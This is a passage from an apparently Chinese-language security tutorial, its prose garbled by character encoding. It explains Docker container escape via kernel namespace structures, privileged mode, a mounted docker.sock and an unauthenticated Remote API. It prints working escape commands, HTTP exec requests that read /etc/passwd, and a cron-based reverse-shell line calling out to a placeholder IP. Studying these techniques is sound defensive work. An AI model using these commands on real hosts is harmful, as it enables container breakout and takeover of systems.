class="meta-keyword">endif</span></span></span><br><span class="line">.mnt_ns= <span class="literal">NULL</span>,</span><br><span class="line">.pid_ns_for_children= &amp;init_pid_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">.net_ns= &amp;init_net,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">.cgroup_ns= &amp;init_cgroup_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TIME_NS</span></span><br><span class="line">.time_ns= &amp;init_time_ns,</span><br><span class="line">.time_ns_for_children= &amp;init_time_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œåœ¨å†…æ ¸ä¸­å­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„<code>nsproxy</code>ï¼Œå³ä¸ºä¸Šé¢çš„<code>init_nsproxy</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">init_task</span></span></span><br><span class="line"><span class="class">#<span class="title">ifdef</span> <span class="title">CONFIG_ARCH_TASK_STRUCT_ON_STACK</span></span></span><br><span class="line"><span class="class">__<span class="title">init_task_data</span></span></span><br><span class="line"><span class="class">#<span class="title">endif</span></span></span><br><span class="line"><span class="class">__<span class="title">aligned</span>(<span class="title">L1_CACHE_BYTES</span>)</span></span><br><span class="line"><span class="class">=</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">.thread_info= INIT_THREAD_INFO(init_task),</span><br><span class="line">.stack_refcount= REFCOUNT_INIT(<span class="number">1</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.__state= <span class="number">0</span>,</span><br><span class="line">.<span class="built_in">stack</span>= init_stack,</span><br><span class="line">.usage= REFCOUNT_INIT(<span class="number">2</span>),</span><br><span class="line">.flags= PF_KTHREAD,</span><br><span class="line">.prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.static_prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.normal_prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.policy= SCHED_NORMAL,</span><br><span class="line">.cpus_ptr= &amp;init_task.cpus_mask,</span><br><span class="line">.user_cpus_ptr= <span class="literal">NULL</span>,</span><br><span class="line">.cpus_mask= CPU_MASK_ALL,</span><br><span class="line">.nr_cpus_allowed= NR_CPUS,</span><br><span class="line">.mm= <span class="literal">NULL</span>,</span><br><span class="line">.active_mm= &amp;init_mm,</span><br><span class="line">.restart_block= &#123;</span><br><span class="line">.fn = do_no_restart_syscall,</span><br><span class="line">&#125;,</span><br><span class="line">.se= &#123;</span><br><span class="line">.group_node = LIST_HEAD_INIT(init_task.se.group_node),</span><br><span class="line">&#125;,</span><br><span class="line">.rt= &#123;</span><br><span class="line">.run_list= LIST_HEAD_INIT(init_task.rt.run_list),</span><br><span class="line">.time_slice= RR_TIMESLICE,</span><br><span class="line">&#125;,</span><br><span class="line">.tasks= LIST_HEAD_INIT(init_task.tasks),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">.pushable_tasks= PLIST_NODE_INIT(init_task.pushable_tasks, MAX_PRIO),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_SCHED</span></span><br><span class="line">.sched_task_group = &amp;root_task_group,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.ptraced= LIST_HEAD_INIT(init_task.ptraced),</span><br><span class="line">.ptrace_entry= LIST_HEAD_INIT(init_task.ptrace_entry),</span><br><span class="line">.real_parent= &amp;init_task,</span><br><span class="line">.parent= &amp;init_task,</span><br><span class="line">.children= LIST_HEAD_INIT(init_task.children),</span><br><span class="line">.sibling= LIST_HEAD_INIT(init_task.sibling),</span><br><span class="line">.group_leader= &amp;init_task,</span><br><span class="line">RCU_POINTER_INITIALIZER(real_cred, &amp;init_cred),</span><br><span class="line">RCU_POINTER_INITIALIZER(cred, &amp;init_cred),</span><br><span class="line">.comm= INIT_TASK_COMM,</span><br><span class="line">.thread= INIT_THREAD,</span><br><span class="line">.fs= &amp;init_fs,</span><br><span class="line">.files= &amp;init_files,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line">.io_uring= <span class="literal">NULL</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.signal= &amp;init_signals,</span><br><span class="line">.sighand= &amp;init_sighand,</span><br><span class="line">.nsproxy= &amp;init_nsproxy,</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(init_task);</span><br></pre></td></tr></table></figure><p>å…¶ä¼šè¢«ç›´æ¥åŠ è½½è¿›å…¥åˆ°<code>init_task</code>ä¹‹ä¸­ã€‚</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼ŒPIDä¸º1çš„è¿›ç¨‹è¢«ç§°ä¸º<code>init</code>è¿›ç¨‹ï¼Œç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹éƒ½æ˜¯é€šè¿‡<code>init</code>è¿›ç¨‹ç›´æ¥æˆ–è€…é—´æ¥<code>fork</code>è€Œæ¥çš„ã€‚è‡ªç„¶è€Œç„¶ï¼Œå®¿ä¸»æœºä¸Šæ²¡æœ‰ç»è¿‡å®¹å™¨åŒ–çš„è¿›ç¨‹ï¼Œä»–ä»¬ä½äºåŒä¸€ç»„<code>namespace</code>ä¸­ï¼Œæ‰€ä»¥ä¼šå…±äº«åŒä¸€ä¸ª<code>struct nsproxy</code>ç»“æ„ä½“ï¼Œå¦‚ä¸‹å›¾ï¼Œå®¹å™¨å†…çš„è¿›ç¨‹çš„<code>namespace</code>ä¸å…¶ä½™è¿›ç¨‹ä¸ä¸€è‡´ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230929180710629.png"                      alt="image-20230929180710629"                ></p><p>äºæ˜¯ä¹å¯ä»¥å¾—å‡ºè¿™æ ·çš„ç»“è®ºï¼Œå¦‚æœå¯ä»¥æŠŠå®¹å™¨å†…çš„<code>exp</code>è¿›ç¨‹çš„<code>nsproxy</code>ä¿®æ”¹ä¸º<code>init_proxy</code>å°±å¯ä»¥å®ç°çªç ´ï¼Œè¾¾åˆ°é€ƒé€¸çš„ç›®çš„äº†ã€‚</p><h2 id="Docker-ç¯å¢ƒåˆ¤æ–­"><a href="#Docker-ç¯å¢ƒåˆ¤æ–­" class="headerlink" title="Docker ç¯å¢ƒåˆ¤æ–­"></a>Docker ç¯å¢ƒåˆ¤æ–­</h2><h3 id="æŸ¥æ‰¾-dockerenv-æ–‡ä»¶"><a href="#æŸ¥æ‰¾-dockerenv-æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾ .dockerenv æ–‡ä»¶"></a>æŸ¥æ‰¾ .dockerenv æ–‡ä»¶</h3><p>dockerä¸‹é»˜è®¤å­˜åœ¨dockerenvæ–‡ä»¶ï¼Œè€Œédockerç¯å¢ƒä¸­åˆ™æ²¡æœ‰</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230929182050141.png"                      alt="image-20230929182050141"                ></p><h3 id="æŸ¥è¯¢-cgroup-è¿›ç¨‹"><a href="#æŸ¥è¯¢-cgroup-è¿›ç¨‹" class="headerlink" title="æŸ¥è¯¢ cgroup è¿›ç¨‹"></a>æŸ¥è¯¢ cgroup è¿›ç¨‹</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230929182215876.png"                      alt="image-20230929182215876"                ></p><h2 id="Docker-é€ƒé€¸"><a href="#Docker-é€ƒé€¸" class="headerlink" title="Docker é€ƒé€¸"></a>Docker é€ƒé€¸</h2><h3 id="ç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#ç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="ç‰¹æƒæ¨¡å¼é€ƒé€¸"></a>ç‰¹æƒæ¨¡å¼é€ƒé€¸</h3><p>ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨æ—¶ï¼Œdockerå®¹å™¨å†…æ‹¥æœ‰å®¿ä¸»æœºæ–‡ä»¶è¯»å†™æƒé™ï¼Œå¯ä»¥é€šè¿‡å†™sshå¯†é’¥ã€è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼è¾¾åˆ°é€ƒé€¸ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># docker run -it --privileged é•œåƒid /bin/bash</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line">Disk /dev/sda: 64 GiB, 68719476736 bytes, 134217728 sectors</span><br><span class="line">Disk model: Ubuntu Linux 20.</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 4096 bytes</span><br><span class="line">I/O size (minimum/optimal): 4096 bytes / 4096 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x1f305916</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 134215679 133163010 63.5G  5 Extended</span><br><span class="line">/dev/sda5       1052672 134215679 133163008 63.5G 83 Linux</span><br><span class="line"><span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># mkdir /test</span></span><br><span class="line">root@7fbc86e39373:~<span class="comment"># mount /dev/sda5 /test</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå†™å…¥è®¡åˆ’ä»»åŠ¡åˆ°å®¿ä¸»æœºå®ç°åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼"><a href="#å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼"></a>å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼</h3><p>åœ¨suidææƒä¸­SUIDè®¾ç½®çš„ç¨‹åºå‡ºç°æ¼æ´å°±éå¸¸å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ‰€ä»¥ Linux å¼•å…¥äº† Capability æœºåˆ¶ä»¥æ­¤æ¥å®ç°æ›´åŠ ç»†è‡´çš„æƒé™æ§åˆ¶ï¼Œä»è€Œå¢åŠ ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><p>åœ¨ <a class="link"   href="https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md" >https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md<i class="fas fa-external-link-alt"></i></a> é“¾æ¥ä¸­æ±‡æ€»äº†ç‰¹æƒæ¨¡å¼ä¸‹æ·»åŠ äº†ä»€ä¹ˆåŠŸèƒ½ã€‚</p><p>é™¤æ­¤ä¹‹å¤–è¿˜éœ€å…·æœ‰ä»¥ä¸‹æ¡ä»¶</p><ul><li>  å¿…é¡»ç¼ºå°‘AppArmoré…ç½®æ–‡ä»¶ï¼Œå¦åˆ™å°†å…è®¸mount syscall</li><li>  èƒ½å¤Ÿâ€œçœ‹åˆ°â€å¾ˆå¤šæ•æ„Ÿçš„devè®¾å¤‡</li></ul><p>ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶ç›®å‰è¿˜ä¸çŸ¥é“å¦‚ä½•è·å–ï¼Œæ‰€ä»¥é‡ç‚¹çœ‹ä¸‹ç‰¹æƒå®¹å™¨ä¸­è·å–çš„ Cap é›†åˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:0000000000000000</span><br><span class="line">CapPrm:000001ffffffffff</span><br><span class="line">CapEff:000001ffffffffff</span><br><span class="line">CapBnd:000001ffffffffff</span><br><span class="line">CapAmb:0000000000000000</span><br></pre></td></tr></table></figure><p>CapEff ä¸»è¦æ˜¯æ£€æŸ¥çº¿ç¨‹çš„æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥é‡ç‚¹çœ‹ä¸‹åˆ©ç”¨ <code>capsh --decode=0000001fffffffff</code> è¿›è¡Œè§£ç ï¼Œæ£€ç´¢é»˜è®¤æ²¡æœ‰æ·»åŠ çš„ NET_ADMINï¼Œå‘ç°å­˜åœ¨<code>cap_net_admin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># capsh --decode=0000001fffffffff</span></span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span><br></pre></td></tr></table></figure><p>è€Œéç‰¹æƒå®¹å™¨çš„ Cap é›†åˆå€¼å¹¶è¿›è¡Œè§£ç ï¼Œå‘ç°å¹¶ä¸å­˜åœ¨ NET_ADMIN</p><h3 id="docker-sock-æŒ‚è½½é€ƒé€¸"><a href="#docker-sock-æŒ‚è½½é€ƒé€¸" class="headerlink" title="docker.sock æŒ‚è½½é€ƒé€¸"></a>docker.sock æŒ‚è½½é€ƒé€¸</h3><p>Dockeré‡‡ç”¨C/Sæ¶æ„ï¼Œæˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„Dockerå‘½ä»¤ä¸­ï¼Œdockerå³ä¸ºclientï¼ŒServerç«¯çš„è§’è‰²ç”±docker daemon(dockerå®ˆæŠ¤è¿›ç¨‹)æ‰®æ¼”ï¼ŒäºŒè€…ä¹‹é—´é€šä¿¡æ–¹å¼æœ‰ä»¥ä¸‹3ç§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unix:///var/run/docker.sock</span><br><span class="line">tcp://host:port</span><br><span class="line">fd://socketfd</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä½¿ç”¨docker.sockè¿›è¡Œé€šä¿¡ä¸ºé»˜è®¤æ–¹å¼ï¼Œå½“å®¹å™¨ä¸­è¿›ç¨‹éœ€åœ¨ç”Ÿäº§è¿‡ç¨‹ä¸­ä¸Dockerå®ˆæŠ¤è¿›ç¨‹é€šä¿¡æ—¶ï¼Œå®¹å™¨æœ¬èº«éœ€è¦æŒ‚è½½/var/run/docker.sockæ–‡ä»¶ã€‚<br>æœ¬è´¨ä¸Šè€Œè¨€ï¼Œèƒ½å¤Ÿè®¿é—®docker socket æˆ–è¿æ¥HTTPS APIçš„è¿›ç¨‹å¯ä»¥æ‰§è¡ŒDockeræœåŠ¡èƒ½å¤Ÿè¿è¡Œçš„ä»»æ„å‘½ä»¤ï¼Œä»¥rootæƒé™è¿è¡Œçš„DockeræœåŠ¡é€šå¸¸å¯ä»¥è®¿é—®æ•´ä¸ªä¸»æœºç³»ç»Ÿã€‚<br>å› æ­¤ï¼Œå½“å®¹å™¨è®¿é—®docker socketæ—¶ï¼Œæˆ‘ä»¬å¯é€šè¿‡ä¸docker daemonçš„é€šä¿¡å¯¹å…¶è¿›è¡Œæ¶æ„æ“çºµå®Œæˆé€ƒé€¸ã€‚è‹¥å®¹å™¨Aå¯ä»¥è®¿é—®docker socketï¼Œæˆ‘ä»¬ä¾¿å¯åœ¨å…¶å†…éƒ¨å®‰è£…clientï¼ˆdockerï¼‰ï¼Œé€šè¿‡docker.sockä¸å®¿ä¸»æœºçš„serverï¼ˆdocker daemonï¼‰è¿›è¡Œäº¤äº’ï¼Œè¿è¡Œå¹¶åˆ‡æ¢è‡³ä¸å®‰å…¨çš„å®¹å™¨Bï¼Œæœ€ç»ˆåœ¨å®¹å™¨Bä¸­æ§åˆ¶å®¿ä¸»æœºã€‚</p><p>é€ƒé€¸çš„æ–¹æ³•ä¸»è¦æ˜¯ä»¥ä¸‹æ“ä½œï¼š</p><p>è¿è¡Œä¸€ä¸ªæŒ‚è½½/var/run/çš„å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾ä¸‹æŒ‚è½½çš„sockæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name docker.sock</span><br></pre></td></tr></table></figure><p>åœ¨å®¹å™¨å†…å®‰è£…clientï¼Œå³docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install docker.io</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®¿ä¸»æœºdockerä¿¡æ¯å¹¶è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨å¹¶æŒ‚è½½å®¿ä¸»æœºæ ¹è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock info</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///host/var/run/docker.sock run -v /:/<span class="built_in">test</span> -it ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure><p>å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure><h3 id="Remote-APIæœªæˆæƒè®¿é—®"><a href="#Remote-APIæœªæˆæƒè®¿é—®" class="headerlink" title="Remote APIæœªæˆæƒè®¿é—®"></a>Remote APIæœªæˆæƒè®¿é—®</h3><p>docker swarmä¸­é»˜è®¤é€šè¿‡2375ç«¯å£é€šä¿¡ã€‚ç»‘å®šäº†ä¸€ä¸ªDocker Remote APIçš„æœåŠ¡ï¼Œå¯ä»¥é€šè¿‡HTTPã€Pythonã€è°ƒç”¨APIæ¥æ“ä½œDockerã€‚</p><p>å½“ä½¿ç”¨å®˜æ–¹æ¨èå¯åŠ¨æ–¹å¼æ—¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰å…¶ä»–ç½‘ç»œè®¿é—®é™åˆ¶çš„ä¸»æœºä¸Šä½¿ç”¨ï¼Œåˆ™ä¼šåœ¨å…¬ç½‘æš´æ¼ç«¯å£ã€‚æ­¤æ—¶è®¿é—®/containers/jsonï¼Œä¾¿ä¼šå¾—åˆ°æ‰€æœ‰å®¹å™¨idå­—æ®µã€‚åˆ›å»ºä¸€ä¸ª execï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/containers/&lt;container_id&gt;/exec</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdin&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStdout&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;AttachStderr&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Cmd&quot;</span>: [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>],</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;DetachKeys&quot;</span>: <span class="string">&quot;ctrl-p,ctrl-q&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Privileged&quot;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;Tty&quot;</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>å‘åŒ…åè¿”å›execçš„idå‚æ•°</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/exec/&lt;exec_id&gt;/start</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;docker_host&gt;:PORT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Detach&quot;</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="json"> <span class="attr">&quot;Tty&quot;</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œexecä¸­çš„å‘½ä»¤ï¼ŒæˆåŠŸè¯»å–passwdæ–‡ä»¶ï¼Œè¿™ç§æ–¹å¼åªæ˜¯è·å–åˆ°äº†dockerä¸»æœºçš„å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œä½†æ˜¯è¿˜æ— æ³•é€ƒé€¸åˆ°å®¿ä¸»æœºã€‚å› æ­¤è¿˜æ˜¯éœ€è¦å†™å…¬é’¥æˆ–è€…è®¡æ—¶ä»»åŠ¡è¿›è¡Œé€ƒé€¸ã€‚</p><p>åœ¨å®¹å™¨å†…å®‰è£…dockerï¼ŒæŸ¥çœ‹å®¿ä¸»æœºdockeré•œåƒä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 images</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ä¸€ä¸ªå®¹å™¨å¹¶å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚åœ¨åˆ°å®¹å™¨çš„testç›®å½•ï¼Œæœ€ååˆæ˜¯å†™è®¡åˆ’ä»»åŠ¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 run -it -v /:/<span class="built_in">test</span> 5d2df19066ac /bin/bash</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨å†…æ ¸æ¼æ´é€ƒé€¸"><a href="#åˆ©ç”¨å†…æ ¸æ¼æ´é€ƒé€¸" class="headerlink" title="åˆ©ç”¨å†…æ ¸æ¼æ´é€ƒé€¸"></a>åˆ©ç”¨å†…æ ¸æ¼æ´é€ƒé€¸</h3><p>ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œdockerçš„å®¹å™¨å…¶å®æ˜¯å’Œå®¿ä¸»æœºå…¬ç”¨åŒä¸€å¥—å†…æ ¸çš„ï¼Œæ‰€ä»¥å¦‚æœå†…å­˜å‡ºç°æ¼æ´æ˜¯å®Œå…¨å¯ä»¥è¿›è¡Œé€ƒé€¸çš„ï¼Œå¹¶ä¸”åœ¨å‰é¢çš„æåˆ°çš„<code>namespace</code>æœºåˆ¶æˆ‘ä»¬å¯ä»¥å¾—çŸ¥çš„æ˜¯è¿›ç¨‹çš„<code>task_truct</code>ä¸­ä½¿ç”¨çš„æ˜¯<code>nsproxy</code>æˆå‘˜å®ç°çš„éš”ç¦»æœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªæˆå‘˜é‚£ä¹ˆå°±å¯ä»¥å®Œæˆé€ƒé€¸äº†ã€‚</p><p>è¿™é‡Œé’ˆå¯¹å†…æ ¸ææƒè¿‡ç¨‹ä¸­çš„ä¸¤ç§æƒ…å†µåˆ†åˆ«ç»™ä¸€ä¸‹å¯¹åº”çš„è§£å†³åŠæ³•ï¼Œåœ¨ä»¥å¾€çš„<code>kernel pwn</code>ä¸­æˆ‘ä»¬æœ€ä¸ºç†ŸçŸ¥çš„ä¸¤ç§ææƒæ–¹å¼æ˜¯ï¼š</p><p>ä¸€ã€ æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><p>äºŒã€ å­˜åœ¨ä»»æ„åœ°å€å†™</p><p>é¦–å…ˆæ˜¯ç¬¬ä¸€ç§æƒ…å†µï¼Œå¦‚æœå¯ä»¥ç›´æ¥æ§åˆ¶ripçš„è¯å¯ä»¥ç›´æ¥è°ƒç”¨å¦‚ä¸‹å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 